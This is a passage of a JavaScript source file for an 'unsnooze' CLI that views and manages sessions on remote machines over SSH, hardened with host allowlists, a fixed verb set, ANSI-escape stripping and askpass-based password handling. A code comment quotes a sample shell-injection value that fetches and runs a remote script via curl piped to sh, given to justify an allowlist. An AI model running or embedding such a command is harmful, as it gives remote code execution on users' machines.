// Fleet: see and manage unsnooze sessions on other machines over the user's
// own OpenSSH. Pull model — no ports, no custom auth, no new deps. The
// remote daemon does all typing under its own gates; this side only views
// and marks. Security invariants (see plans/multi-host-sessions.md):
// allowlisted host tokens, closed verb set, sentinel-framed JSON, and
// control-char-stripped ingest.
import { join } from 'node:path';
import { readFileSync, writeFileSync, renameSync, mkdirSync, existsSync as fsExistsSync } from 'node:fs';
import { spawn, execFileSync, spawnSync } from 'node:child_process';
import { STATE_DIR } from './config.js';
import { colors, shouldUseTui, makeTable, logoBlock, badge } from './tui.js';
import { ensureAskpassHelper, resolveSecret, readSecret } from './askpass.js';
import { UNSNOOZE_BIN } from './spawn.js';

export const SCHEMA = 1;
export const MIN_SCHEMA = 1;
export const BEGIN = '___UNSNOOZE_BEGIN___';
export const END = '___UNSNOOZE_END___';

// Host aliases/destinations: no leading '-' (ssh would read it as an option —
// the git CVE-2017-1000117 class), no whitespace or shell metacharacters.
export const HOST_RE = /^[A-Za-z0-9][A-Za-z0-9_.@-]*$/;
// Session keys as produced by state.js (uuid or pane:<hash>:<ts>).
export const KEY_RE = /^[A-Za-z0-9:%._-]{1,128}$/;

export function validHostToken(s) {
  return typeof s === 'string' && s.length > 0 && s.length <= 128 && HOST_RE.test(s);
}

const REMOTE_VERBS = new Set(['status', 'resume', 'cancel']);

// ssh -V prints to STDERR; capture it. Returns '' on any failure.
function defaultRun(bin, args) {
  const r = spawnSync(bin, args, { encoding: 'utf-8' });
  return String(r.stderr || r.stdout || '');
}

export function parseSshVersion(banner) {
  const m = String(banner || '').match(/OpenSSH(_for_Windows)?_(\d+)\.(\d+)/i);
  if (!m) return { ok: false, flavor: 'unknown', major: 0, minor: 0, askpass: false, multiplex: false };
  const nativeWindows = !!m[1];
  const major = Number(m[2]), minor = Number(m[3]);
  const atLeast84 = major > 8 || (major === 8 && minor >= 4);
  return {
    ok: true,
    flavor: nativeWindows ? 'native-windows' : 'unix',
    major, minor,
    askpass: atLeast84,           // SSH_ASKPASS_REQUIRE=force (OpenSSH 8.4+)
    multiplex: !nativeWindows,    // ControlMaster needs unix sockets; native win hard-errors
  };
}

let _sshCache = null;
export function detectSsh({
  platform = process.platform,
  run = defaultRun,
  existsSync = fsExistsSync,
  cache = true,
} = {}) {
  if (cache && _sshCache) return _sshCache;
  let bin = 'ssh';
  if (platform === 'win32') {
    const probes = [
      'C:\\Windows\\System32\\OpenSSH\\ssh.exe',
      'C:\\Program Files\\Git\\usr\\bin\\ssh.exe',
    ];
    const found = probes.find(p => existsSync(p));
    if (found) bin = found;   // prefer a concrete install; else fall through to PATH 'ssh'
  }
  const info = { bin, ...parseSshVersion(run(bin, ['-V'])) };
  if (cache) _sshCache = info;
  return info;
}

// Fixed hardening flags, always before the host so nothing tainted can be
// read as an option. StrictHostKeyChecking is deliberately NOT set: a CLI -o
// would override a stricter user config; unknown hosts fail fast under
// BatchMode with a clear hint instead.
// `multiplex:false` omits the three ControlMaster/-Path/-Persist options —
// native Win32-OpenSSH hard-errors on them (no unix-socket support). `batch:
// false` omits BatchMode=yes — the one case that needs it gone is an
// interactive password `prompt` host: ssh must be allowed to prompt on the
// console instead of failing closed (see sshEnvForHost).
export function sshArgs(dest, remoteCmd, { multiplex = true, batch = true } = {}) {
  if (!validHostToken(dest)) throw new Error(`invalid host: ${JSON.stringify(dest)}`);
  const [verb, ...rest] = remoteCmd;
  if (!REMOTE_VERBS.has(verb)) throw new Error(`invalid remote verb: ${verb}`);
  for (const a of rest) {
    if (!KEY_RE.test(String(a))) throw new Error(`invalid remote arg: ${JSON.stringify(a)}`);
  }
  const opts = [];
  if (batch) opts.push('-o', 'BatchMode=yes');
  opts.push('-o', 'ConnectTimeout=5');
  if (multiplex) {
    opts.push(
      '-o', 'ControlMaster=auto',
      '-o', `ControlPath=${join(STATE_DIR, 'ssh-%C')}`,
      '-o', 'ControlPersist=60s',
    );
  }
  return [
    ...opts,
    '-T',
    dest,
    'unsnooze', '_remote', verb, ...rest.map(String),
  ];
}

// Compose the ssh child's env additions for a host's auth mode. Key hosts
// get nothing — the path stays byte-for-byte what it was before password
// auth existed (batch left unspecified → sshArgs' own default of true).
//
// Every password path that actually attempts a connection returns
// batch:false — this is load-bearing, not cosmetic: OpenSSH disables
// password/keyboard-interactive auth the instant BatchMode=yes is set, and
// it does so BEFORE ever consulting SSH_ASKPASS. A stored source (env/
// keychain/command) pointed at the askpass helper via
// SSH_ASKPASS_REQUIRE=force (OpenSSH >=8.4 only — gated on ssh.askpass)
// would never get a chance to run if BatchMode stayed on — ssh would just
// exit 255 "Permission denied" without ever invoking the helper. So the
// secret flows helper-stdout -> ssh and never touches argv or this
// process's own env, AND BatchMode must be off for that helper to ever run.
// A `prompt` source at a real interactive TTY skips askpass entirely: it
// also returns batch:false so ssh prompts directly on the console — the
// zero-shim path. Only a `prompt` source with no terminal to prompt from
// (the daemon) and ssh too old for askpass short-circuit to needsAuth
// before ever spawning ssh, so batch is moot there.
export function sshEnvForHost(entry, { ssh, helperPath, interactive = false } = {}) {
  if (!entry || entry.auth !== 'password') return { env: {} };
  if (entry.source === 'prompt') {
    if (interactive) return { env: {}, batch: false };
    // daemon: nothing to prompt from
    return { env: {}, needsAuth: true, error: 'prompt source needs an interactive terminal — use env/command/keychain for the daemon' };
  }
  if (!ssh?.askpass) {
    return {
      env: {}, needsAuth: true,
      error: 'ssh too old or unrecognized for non-interactive password auth (needs OpenSSH 8.4+ for SSH_ASKPASS_REQUIRE)',
    };
  }
  return {
    env: {
      SSH_ASKPASS: helperPath,
      SSH_ASKPASS_REQUIRE: 'force',
      UNSNOOZE_ASKPASS_HOST: entry.name,
    },
    batch: false,
  };
}

export function frameEnvelope(obj) {
  return BEGIN + JSON.stringify(obj) + END;
}

export function extractEnvelope(text) {
  const s = String(text ?? '');
  const a = s.indexOf(BEGIN);
  const b = s.indexOf(END, a + BEGIN.length);
  if (a === -1 || b === -1) return null;
  try {
    return JSON.parse(s.slice(a + BEGIN.length, b));
  } catch {
    return null;
  }
}

// Kill every escape/control channel a hostile remote could use against the
// local terminal, then cap length. Covers both the 7-bit (ESC-prefixed) and
// 8-bit (raw C1 byte) encodings of each sequence class:
//   - DCS   (Device Control String): ESC P ... ST   | C1 0x90 ... ST
//   - SOS/PM/APC (string-type):      ESC X/^/_ ... ST | C1 0x98/0x9e/0x9f ... ST
//   - OSC   (incl. window title 0/2, hyperlinks 8, clipboard 52): ESC ] ... BEL|ST | C1 0x9d ... BEL|ST
//   - CSI   (SGR color codes etc):   ESC [ ... final | C1 0x9b ... final
//   - bare two-char escapes (ESC c, ESC 7, ESC =, ...)
//   - C0 controls (incl. TAB/LF/CR), DEL, and any leftover single C1 byte —
//     all fleet string fields are single-line, so TAB/LF/CR are stripped too
//     rather than let a hostile field inject fake rows into the fleet table
// Alternation order matters: the multi-byte sequence forms are tried before
// the single-byte catch-all so a C1 introducer (e.g. \x9b) consumes its
// whole sequence instead of being stripped alone and leaking its payload.
// (The Terminal DiLLMa / Codex-CLI ANSI-injection class.)
/* eslint-disable no-control-regex */
const VT_RE =
  /(?:\x1bP|\x90)[^\x1b\x9c]*(?:\x1b\\|\x9c)?|(?:\x1b[X^_]|[\x98\x9e\x9f])[^\x1b\x9c]*(?:\x1b\\|\x9c)?|(?:\x1b\]|\x9d)[^\x07\x1b\x9c]*(?:\x07|\x1b\\|\x9c)?|(?:\x1b\[|\x9b)[0-9:;<=>?]*[ -/]*[@-~]?|\x1b[ -~]?|[\x00-\x1f\x7f\x80-\x9f]/g;

export function stripRemoteText(s, max = 256) {
  if (s == null) return '';
  return String(s).replace(VT_RE, '').slice(0, max);
}

export function validateEnvelope(obj) {
  if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return { ok: false, reason: 'not an object' };
  if (!Number.isInteger(obj.schema) || !Number.isInteger(obj.minSchema)) return { ok: false, reason: 'missing schema' };
  if (obj.minSchema > SCHEMA || obj.schema < MIN_SCHEMA) {
    return { ok: false, reason: `version skew (remote schema ${obj.schema}, local ${SCHEMA})` };
  }
  return { ok: true };
}

// ---------------------------------------------------------------------------
// Host registry — ~/.unsnooze/hosts.json  { "<name>": "<ssh destination>" |
// { dest, auth: 'key'|'password', source?, env?, service?, account?, cmd? } }
// A bare string is a legacy/diff-friendly shorthand for key auth; readHosts()
// normalizes both forms to the descriptor shape, writeHosts (via cmdHosts)
// collapses key-auth descriptors back to bare strings on save. A separate
// single-purpose file (not config.json): settings.js has no dynamic-key
// support and the config surface stays small.
// ---------------------------------------------------------------------------

const HOSTS_FILE = join(STATE_DIR, 'hosts.json');

// Password-auth sources: where cmdFleet/fetchHost pull a credential from when
// a host needs a password instead of an ssh key. Kept as a fixed set (not
// free text) since the source name gates which of env/service/account/cmd
// fields are consulted downstream.
const SOURCES = new Set(['prompt', 'env', 'keychain', 'command']);
// Env var names: POSIX shell identifier shape, so a hostile/typo'd name can
// never smuggle a shell metacharacter into anything that reads process.env.
const ENV_NAME_RE = /^[A-Za-z_][A-Za-z0-9_]{0,63}$/;

// Normalize a raw hosts.json value (string = legacy key host, or an already
// object-shaped entry) into a canonical descriptor. Returns null for
// anything unrecognizable so readHosts can drop it rather than propagate
// malformed/tampered disk state.
function normalizeHostEntry(raw) {
  if (typeof raw === 'string') {
    return validHostToken(raw) ? { dest: raw, auth: 'key' } : null;
  }
  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return null;
  if (!validHostToken(raw.dest)) return null;
  if (raw.auth !== 'password') return { dest: raw.dest, auth: 'key' };
  const source = SOURCES.has(raw.source) ? raw.source : 'prompt';
  const e = { dest: raw.dest, auth: 'password', source };
  if (source === 'env' && ENV_NAME_RE.test(raw.env || '')) e.env = raw.env;
  if (source === 'keychain') {
    if (typeof raw.service === 'string') e.service = stripRemoteText(raw.service, 128);
    if (typeof raw.account === 'string') e.account = stripRemoteText(raw.account, 128);
  }
  if (source === 'command' && typeof raw.cmd === 'string') e.cmd = raw.cmd;
  return e;
}

// A descriptor's dest, tolerating both the normalized object shape and a
// bare legacy string — lets callers (fetchFleet, formatFleetTui) accept
// either without forcing every caller through readHosts() first (tests and
// callers that build a hosts map by hand still work).
function entryDest(v) {
  if (typeof v === 'string') return v;
  return v && typeof v === 'object' ? v.dest : undefined;
}

// Inverse of normalizeHostEntry for the write path: a plain key-auth entry
// collapses back to the bare string form so hosts.json stays diff-friendly
// for the common case; password entries keep their full descriptor.
function serializeHostEntry(e) {
  return e && typeof e === 'object' && e.auth === 'key' ? e.dest : e;
}

function serializeHosts(hosts) {
  const out = Object.create(null);
  for (const [name, e] of Object.entries(hosts)) out[name] = serializeHostEntry(e);
  return out;
}

export function readHosts() {
  const out = Object.create(null);
  try {
    const raw = JSON.parse(readFileSync(HOSTS_FILE, 'utf-8'));
    if (raw && typeof raw === 'object' && !Array.isArray(raw)) {
      for (const [name, v] of Object.entries(raw)) {
        if (!validHostToken(name)) continue;
        const e = normalizeHostEntry(v);
        if (e) out[name] = e;
      }
    }
  } catch { /* absent or unreadable → empty */ }
  return out;
}

export function writeHosts(hosts) {
  mkdirSync(STATE_DIR, { recursive: true });
  const tmp = HOSTS_FILE + `.tmp.${process.pid}`;
  writeFileSync(tmp, JSON.stringify(hosts, null, 2) + '\n');
  renameSync(tmp, HOSTS_FILE);
}

function parseFlags(argv) {
  const f = {};
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === '--auth') f.auth = argv[++i];
    else if (a === '--source') f.source = argv[++i];
    else if (a === '--env') f.env = argv[++i];
    else if (a === '--service') f.service = argv[++i];
    else if (a === '--account') f.account = argv[++i];
    else if (a === '--cmd') f.cmd = argv[++i];
  }
  return f;
}

export async function cmdHosts(args = [], { spawnFn, detect, timeoutMs } = {}) {
  const [verb, name, dest] = args;
  const hosts = readHosts();
  if (verb === 'list' || verb === undefined) {
    const names = Object.keys(hosts);
    if (names.length === 0) {
      console.log('unsnooze: no hosts registered. Add one: unsnooze hosts add <name> [ssh-destination]');
      return 0;
    }
    for (const n of names) {
      const e = hosts[n];
      const tag = e.auth === 'password' ? `  (password via ${e.source})` : '';
      console.log(`  ${n.padEnd(16)} ${e.dest}${tag}`);
    }
    return 0;
  }
  if (verb === 'add') {
    const d = dest ?? name;
    if (!validHostToken(name) || !validHostToken(d)) {
      console.error('unsnooze: invalid host name/destination (letters, digits, . _ @ - only; no leading -).');
      return 1;
    }
    const f = parseFlags(args.slice(3));
    let entry = d;   // default: bare string = key auth
    if (f.auth === 'password') {
      const source = f.source ?? 'prompt';
      if (!SOURCES.has(source)) { console.error(`unsnooze: unknown source '${source}' (prompt|env|keychain|command)`); return 1; }
      if (source === 'command' && !f.cmd) { console.error('unsnooze: --source command requires --cmd'); return 1; }
      if (source === 'env' && f.env && !ENV_NAME_RE.test(f.env)) { console.error('unsnooze: invalid --env name'); return 1; }
      entry = { dest: d, auth: 'password', source };
      if (source === 'env') {
        entry.env = f.env || `UNSNOOZE_PW_${name.toUpperCase().replace(/[^A-Z0-9_]/g, '_')}`;
      }
      if (source === 'keychain') {
        entry.service = stripRemoteText(f.service || `unsnooze-${name}`, 128);
        entry.account = stripRemoteText(f.account || d.split('@')[0], 128);
      }
      if (source === 'command') entry.cmd = f.cmd;
    } else if (f.auth && f.auth !== 'key') {
      console.error(`unsnooze: unknown --auth '${f.auth}' (key|password)`);
      return 1;
    }
    hosts[name] = entry;
    writeHosts(serializeHosts(hosts));
    const authHint = entry.auth === 'password'
      ? `password auth via ${entry.source} (see \`unsnooze hosts test ${name}\`)`
      : 'ssh key access';
    console.log(`unsnooze: host ${name} → ${d}. It needs unsnooze installed and ${authHint}.`);
    return 0;
  }
  if (verb === 'rm') {
    if (!(name in hosts)) {
      console.error(`unsnooze: no such host: ${name}`);
      return 1;
    }
    delete hosts[name];
    writeHosts(serializeHosts(hosts));
    console.log(`unsnooze: removed ${name}.`);
    return 0;
  }
  if (verb === 'test') {
    if (!name) { console.error('usage: unsnooze hosts test <name>'); return 2; }
    const entry = hosts[name];
    if (!entry) { console.error(`unsnooze: no such host: ${name}`); return 1; }
    // Phase 1: resolve the credential in-process — enough to confirm the
    // source is reachable/set without ever letting the value touch stdout.
    // A failure here means ssh would fail identically (no askpass helper
    // could resolve it either), so skip the network round trip entirely
    // rather than print a misleadingly-successful probe below it.
    if (entry.auth === 'password' && entry.source === 'prompt') {
      // A `prompt` source reads from the terminal — resolving it here would
      // prompt the user once for this phase-1 check and again for the
      // phase-2 connection below. Nothing to pre-validate: it either has a
      // terminal or it doesn't, and phase 2 will surface that.
      console.log('unsnooze: auth: interactive — will prompt on connect');
    } else if (entry.auth === 'password') {
      try {
        await resolveSecret(entry, { readSecret });
        console.log('unsnooze: auth: source resolved ok');
      } catch (e) {
        console.log(`unsnooze: auth: ${e.message}`);
        console.log('unsnooze: needs-setup');
        return 1;
      }
    }
    // Phase 2: a real reachability probe over ssh (same transport `fleet`
    // uses) — this is the only phase that ever touches the network.
    const r = await fetchHost(name, entry, { spawnFn, detect, timeoutMs, interactive: !!process.stdin.isTTY });
    if (r.state === 'online') {
      console.log(entry.auth === 'password' ? 'unsnooze: auth ok' : 'unsnooze: key ok');
      return 0;
    }
    console.log(`unsnooze: needs-setup: ${r.error || r.state}`);
    return 1;
  }
  console.error('usage: unsnooze hosts [list | add <name> [ssh-destination] | rm <name> | test <name>]');
  return 2;
}

// ---------------------------------------------------------------------------
// ssh fan-out — one status/resume/cancel call per host, bounded concurrency,
// hard-killed on timeout so one dead box never blocks the render.
// ---------------------------------------------------------------------------

const STDOUT_CAP = 256 * 1024;
const STDERR_CAP = 4 * 1024;
const MAX_SESSIONS = 200;
const FLEET_CACHE_FILE = join(STATE_DIR, 'fleet-cache.json');
const STALE_WINDOW_MS = 24 * 3_600_000;

// Drains a spawned ssh child: caps stdout/stderr, hard-kills at timeoutMs,
// and always resolves (never rejects) so a dead host can't hang Promise.all.
// stderr is kept (small cap — just enough to classify an auth failure, see
// AUTH_FAIL_RE below) since OpenSSH writes "Permission denied ..." there,
// never on stdout.
function collectChild(child, timeoutMs) {
  return new Promise((resolve) => {
    let out = Buffer.alloc(0);
    let err = Buffer.alloc(0);
    let capped = false;
    let timedOut = false;
    let done = false;
    const finish = (code) => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      resolve({ code, stdout: out.toString('utf8'), stderr: err.toString('utf8'), timedOut });
    };
    const timer = setTimeout(() => {
      timedOut = true;
      try { child.kill('SIGKILL'); } catch { /* already gone */ }
    }, timeoutMs);
    child.stdout?.on('data', (chunk) => {
      if (capped) return;
      out = Buffer.concat([out, chunk]);
      if (out.length > STDOUT_CAP) { out = out.subarray(0, STDOUT_CAP); capped = true; }
    });
    child.stderr?.on('data', (chunk) => {
      if (err.length >= STDERR_CAP) return;
      err = Buffer.concat([err, chunk]).subarray(0, STDERR_CAP);
    });
    child.on('close', (code) => finish(code));
    child.on('error', () => finish(null));
  });
}

// OpenSSH writes auth failures to stderr in exactly this shape: "Permission
// denied (publickey,password)."; never trust this for a key-auth host — a
// key host getting Permission denied is a genuine key problem (wrong/
// missing key, wrong user), not a password-source issue, so it must stay
// unreachable/error rather than mislabel itself needs-auth. Matching only
// "Permission denied (" (not a bare "password"/"publickey" substring
// anywhere in stderr) avoids mislabeling a non-auth 255 whose banner just
// happens to mention "password" (e.g. a motd or a proxy's own error text)
// as needs-auth.
const AUTH_FAIL_RE = /Permission denied \(/;
function isPasswordAuthFailure(entry, stderr) {
  return entry.auth === 'password' && AUTH_FAIL_RE.test(String(stderr || ''));
}

function str(v, max) {
  if (v == null) return null;
  return stripRemoteText(v, max);
}

function num(v) {
  return Number.isFinite(v) ? v : null;
}

// Explicit field-by-field extraction into a fresh literal — never
// Object.assign/spread of the parsed remote object (prototype-pollution and
// field-smuggling defense). Every string is run through stripRemoteText.
function sanitizeSession(s) {
  if (!s || typeof s !== 'object') return null;
  return {
    key: str(s.key, 128) || '',
    sessionId: str(s.sessionId, 128),
    agent: str(s.agent, 128) || 'claude',
    cwd: str(s.cwd, 256),
    status: str(s.status, 128) || 'unknown',
    limitType: str(s.limitType, 128),
    resetAt: num(s.resetAt),
    resetSource: str(s.resetSource, 128),
    mux: str(s.mux, 128),
    pane: str(s.pane, 128),
    muxSession: str(s.muxSession, 128),
    attempts: Number.isFinite(s.attempts) ? s.attempts : 0,
    lastError: str(s.lastError, 256),
    workspaceHold: !!s.workspaceHold,
  };
}

export function sanitizeEnvelope(env) {
  const sessionsIn = Array.isArray(env?.sessions) ? env.sessions.slice(0, MAX_SESSIONS) : [];
  return {
    schema: num(env?.schema),
    minSchema: num(env?.minSchema),
    cli: str(env?.cli, 128),
    host: str(env?.host, 128),
    caps: Array.isArray(env?.caps) ? env.caps.slice(0, 16).map(c => str(c, 128)).filter(Boolean) : [],
    resumerAlive: !!env?.resumerAlive,
    sessions: sessionsIn.map(sanitizeSession).filter(Boolean),
  };
}

// fetchHost/remoteAction's 2nd arg is either a bare dest string (the legacy
// shorthand — still what a plain `{ good: 'good' }` hosts map or the
// dashboard's stitched-back r.dest gives us) or a full host descriptor.
// Normalize both to a descriptor with `name` attached, since sshEnvForHost
// needs the host name for UNSNOOZE_ASKPASS_HOST.
function toEntry(name, v) {
  const base = typeof v === 'string' ? { dest: v, auth: 'key' } : (v || {});
  return { ...base, name };
}

// Shared by fetchHost and remoteAction: detect ssh, provision the askpass
// helper for password hosts, resolve the auth env/batch mode for this host
// (sshEnvForHost), build the hardened argv (sshArgs), and spawn. Pulled out
// to one function so the C1 batch-mode fix can never diverge between the
// two call sites again — previously each duplicated this
// detect->ensureAskpassHelper->sshEnvForHost->sshArgs->spawn block.
function composeSshSpawn(name, entryOrDest, remoteCmd, { spawnFn, detect, interactive }) {
  const entry = toEntry(name, entryOrDest);
  const ssh = detect();
  const helperPath = entry.auth === 'password'
    ? ensureAskpassHelper({ platform: process.platform, stateDir: STATE_DIR, scriptPath: UNSNOOZE_BIN })
    : undefined;
  const { env: envAdditions, batch, needsAuth, error } = sshEnvForHost(entry, { ssh, helperPath, interactive });
  // No resolvable credential (ssh too old, or a `prompt` source with no
  // terminal to prompt on) — never spawn ssh just to watch it fail.
  if (needsAuth) return { entry, needsAuth: true, error };
  const args = sshArgs(entry.dest, remoteCmd, { multiplex: ssh.multiplex, batch: batch !== false });
  const child = spawnFn(ssh.bin, args, { env: { ...process.env, ...envAdditions } });
  return { entry, child };
}

export async function fetchHost(name, entryOrDest, {
  spawnFn = spawn, timeoutMs = 8000, detect = detectSsh, interactive = false,
} = {}) {
  const at = Date.now();
  let entry, child;
  try {
    const composed = composeSshSpawn(name, entryOrDest, ['status'], { spawnFn, detect, interactive });
    entry = composed.entry;
    if (composed.needsAuth) {
      return { host: name, state: 'needs-auth', at, error: composed.error || 'no resolvable credential' };
    }
    child = composed.child;
  } catch (err) {
    return { host: name, state: 'error', at, error: String(err?.message || err) };
  }
  const { code, stdout, stderr, timedOut } = await collectChild(child, timeoutMs);
  const latencyMs = Date.now() - at;
  if (timedOut) return { host: name, state: 'unreachable', at, latencyMs, error: 'timeout' };
  if (code === 255) {
    if (isPasswordAuthFailure(entry, stderr)) {
      return { host: name, state: 'needs-auth', at, latencyMs, error: 'ssh auth failed' };
    }
    return { host: name, state: 'unreachable', at, latencyMs, error: `ssh exit ${code}` };
  }
  const parsed = extractEnvelope(stdout);
  if (!parsed) return { host: name, state: 'error', at, latencyMs, error: 'bad or missing response frame' };
  const v = validateEnvelope(parsed);
  if (!v.ok) return { host: name, state: 'skew', at, latencyMs, error: v.reason };
  return { host: name, state: 'online', at, latencyMs, envelope: sanitizeEnvelope(parsed) };
}

// Same transport for resume/cancel — marks state only, never types anything
// (typing lives in the remote's own daemon gates; see src/remote.js).
export async function remoteAction(name, entryOrDest, verb, key, {
  spawnFn = spawn, timeoutMs = 8000, detect = detectSsh, interactive = false,
} = {}) {
  const remoteCmd = key != null ? [verb, key] : [verb];
  let entry, child;
  try {
    const composed = composeSshSpawn(name, entryOrDest, remoteCmd, { spawnFn, detect, interactive });
    entry = composed.entry;
    if (composed.needsAuth) {
      return { ok: false, result: null, error: composed.error || 'no resolvable credential', needsAuth: true };
    }
    child = composed.child;
  } catch (err) {
    return { ok: false, result: null, error: String(err?.message || err) };
  }
  const { code, stdout, stderr, timedOut } = await collectChild(child, timeoutMs);
  if (timedOut) return { ok: false, result: null, error: 'timeout' };
  if (code === 255) {
    if (isPasswordAuthFailure(entry, stderr)) {
      return { ok: false, result: null, error: 'ssh auth failed', needsAuth: true };
    }
    return { ok: false, result: null, error: `ssh exit ${code}` };
  }
  const parsed = extractEnvelope(stdout);
  if (!parsed) return { ok: false, result: null, error: 'bad or missing response frame' };
  const v = validateEnvelope(parsed);
  if (!v.ok) return { ok: false, result: null, error: v.reason };
  const result = str(parsed.result, 128) || '';
  if (result === 'ok') return { ok: true, result };
  return { ok: false, result, error: `remote: ${result || 'unknown'}` };
}

export function readFleetCache() {
  try {
    const raw = JSON.parse(readFileSync(FLEET_CACHE_FILE, 'utf-8'));
    return Array.isArray(raw) ? raw : [];
  } catch {
    return [];
  }
}

export function writeFleetCache(results) {
  mkdirSync(STATE_DIR, { recursive: true });
  const tmp = FLEET_CACHE_FILE + `.tmp.${process.pid}`;
  writeFileSync(tmp, JSON.stringify(results, null, 2) + '\n');
  renameSync(tmp, FLEET_CACHE_FILE);
}

// I1: a `prompt`-source host at a real interactive TTY is the one case
// where ssh prompts a human directly on /dev/tty (sshEnvForHost returns
// batch:false with no askpass env). Those hosts must never share the
// pooled-concurrency worker loop below or its default 8s kill timeout —
// a slow typist would get SIGKILLed mid-password, and concurrency:4 would
// let several /dev/tty prompts interleave and corrupt each other's no-echo
// terminal state. They're partitioned out and run serially afterward with
// a generous timeout instead.
function isInteractivePromptHost(name, raw, interactive) {
  const entry = toEntry(name, raw);
  return !!interactive && entry.auth === 'password' && entry.source === 'prompt';
}

// Far longer than the pooled default (8s) — long enough that a human typing
// a password is never SIGKILLed mid-entry. Only applies to the serial
// interactive-prompt pass below; the pooled fan-out keeps its own default.
const INTERACTIVE_PROMPT_TIMEOUT_MS = 10 * 60_000;

// Bounded-concurrency fan-out: a dead host is hard-killed by fetchHost's own
// timeout and never blocks the others (allSettled + a fixed worker pool,
// not one promise per host). Online results overwrite the cache; hosts that
// come back unreachable/error fall back to a cached envelope under 24h old,
// rendered as `stale` rather than dropped. Interactive-prompt hosts (see
// isInteractivePromptHost) are excluded from this pool and run afterward,
// one at a time — see below.
export async function fetchFleet({ hosts = readHosts(), concurrency = 4, spawnFn, timeoutMs, detect, interactive } = {}) {
  const entries = Object.entries(hosts);
  const cacheByHost = new Map(readFleetCache().map(r => [r.host, r]));
  const results = new Array(entries.length);

  const pooledIdx = [];
  const promptIdx = [];
  for (let i = 0; i < entries.length; i++) {
    const [name, raw] = entries[i];
    (isInteractivePromptHost(name, raw, interactive) ? promptIdx : pooledIdx).push(i);
  }

  let next = 0;
  async function worker() {
    while (next < pooledIdx.length) {
      const i = pooledIdx[next++];
      const [name, raw] = entries[i];
      try {
        results[i] = await fetchHost(name, raw, { spawnFn, timeoutMs, detect, interactive });
      } catch (err) {
        results[i] = { host: name, state: 'error', at: Date.now(), error: String(err?.message || err) };
      }
    }
  }
  const workerCount = Math.max(1, Math.min(concurrency, pooledIdx.length));
  if (pooledIdx.length > 0) await Promise.allSettled(Array.from({ length: workerCount }, worker));

  // Serial, one /dev/tty prompt at a time, generous timeout unless the
  // caller explicitly overrode it.
  for (const i of promptIdx) {
    const [name, raw] = entries[i];
    try {
      results[i] = await fetchHost(name, raw, {
        spawnFn, detect, interactive, timeoutMs: timeoutMs ?? INTERACTIVE_PROMPT_TIMEOUT_MS,
      });
    } catch (err) {
      results[i] = { host: name, state: 'error', at: Date.now(), error: String(err?.message || err) };
    }
  }

  const merged = results.map((r) => {
    if (r.state === 'online') return r;
    const cached = cacheByHost.get(r.host);
    if ((r.state === 'unreachable' || r.state === 'error') && cached?.envelope
      && Number.isFinite(cached.at) && (Date.now() - cached.at) < STALE_WINDOW_MS) {
      return { host: r.host, state: 'stale', at: r.at, cachedAt: cached.at, envelope: sanitizeEnvelope(cached.envelope), error: r.error };
    }
    return r;
  });

  // Only successful fetches refresh the cache; hosts we couldn't reach this
  // round keep whatever was already on disk for the next run's staleness check.
  for (const r of merged) {
    if (r.state === 'online') cacheByHost.set(r.host, { host: r.host, state: 'online', at: r.at, envelope: r.envelope });
  }
  writeFleetCache([...cacheByHost.values()]);

  return merged;
}

// muxSession is remote-controlled and only control-char-stripped on ingest
// (stripRemoteText), so shell metacharacters survive into it. The hint below
// is meant to be pasted into a local shell — unquoted interpolation of a
// hostile muxSession (e.g. `x'; curl evil.sh|sh; echo '`) would turn a
// copy-paste hint into local RCE. Session names are always plain tmux/zellij
// identifiers, so a tight allowlist costs nothing.
export const MUX_SESSION_RE = /^[A-Za-z0-9_.-]{1,64}$/;

// The local attach hint (src/reap.js: attachHint) wrapped in `ssh -t` so it
// can be pasted verbatim to reattach on the remote box. Returns null (no
// hint) rather than a dangerous string when dest or muxSession don't pass
// validation — callers must treat null as "omit the attach line".
export function attachHintRemote(dest, muxName, muxSession) {
  if (!validHostToken(dest) || typeof muxSession !== 'string' || !MUX_SESSION_RE.test(muxSession)) return null;
  const inner = muxName === 'zellij' ? `zellij attach ${muxSession}` : `tmux new -A -s ${muxSession}`;
  return `ssh -t ${dest} '${inner}'`;
}

function fmtCountdown(ms) {
  if (ms <= 0) return 'due now';
  const m = Math.round(ms / 60_000);
  if (m < 60) return `${m}m`;
  const h = Math.floor(m / 60);
  return `${h}h ${m % 60}m`;
}

function stateGlyph(state, c) {
  if (state === 'online') return c.green('● online');
  if (state === 'stale') return c.yellow('◐ stale');
  if (state === 'needs-auth') return c.yellow('◐ needs-auth');
  if (state === 'skew') return c.red('✗ skew');
  return c.red(`✗ ${state}`);
}

export function formatFleetTui(results, { color = true, hosts = {}, now = Date.now() } = {}) {
  const c = colors(color);
  const lines = [logoBlock('fleet', { color, subtitle: `${results.length} host(s)` }), ''];
  if (results.length === 0) {
    lines.push(c.dim('  no hosts registered. `unsnooze hosts add <name>` first.'));
    return lines.join('\n');
  }
  const rows = results.map((r) => {
    const sessions = r.envelope?.sessions ?? [];
    const counts = new Map();
    for (const s of sessions) counts.set(s.status, (counts.get(s.status) || 0) + 1);
    const summary = [...counts.entries()].map(([k, n]) => `${n} ${k}`).join(', ') || '—';
    const age = r.state === 'stale'
      ? `cached ${fmtCountdown(now - r.cachedAt)} ago`
      : (r.latencyMs != null ? `${r.latencyMs}ms` : (r.error || '—'));
    return [stateGlyph(r.state, c), r.host, summary, age];
  });
  lines.push(makeTable(['state', 'host', 'sessions', 'age'], rows, { color }));
  for (const r of results) {
    const stopped = (r.envelope?.sessions ?? []).filter(s => s.status === 'stopped');
    if (stopped.length === 0) continue;
    lines.push('');
    lines.push(c.dim(`  ${r.host}:`));
    for (const s of stopped) {
      const id = s.sessionId ? s.sessionId.slice(0, 8) : (s.key ? s.key.slice(0, 8) : '(no id)');
      const when = Number.isFinite(s.resetAt) ? fmtCountdown(s.resetAt - now) : '?';
      const dest = entryDest(hosts[r.host]) || r.host;
      const hint = s.muxSession ? attachHintRemote(dest, s.mux || 'tmux', s.muxSession) : null;
      lines.push(`    ${badge(s.status, { color })} ${c.bright(id)}  ${(s.agent || 'claude').padEnd(6)} resets ${when}${hint ? `  attach: ${hint}` : ''}`);
    }
  }
  return lines.join('\n');
}

// Exit 0 (nothing actionable), 1 (internal error), 2 (some online/stale host
// has a stopped session — matches `preview`'s actionable convention).
export async function cmdFleet(args = []) {
  try {
    const json = args.includes('--json');
    const hosts = readHosts();
    if (Object.keys(hosts).length === 0) {
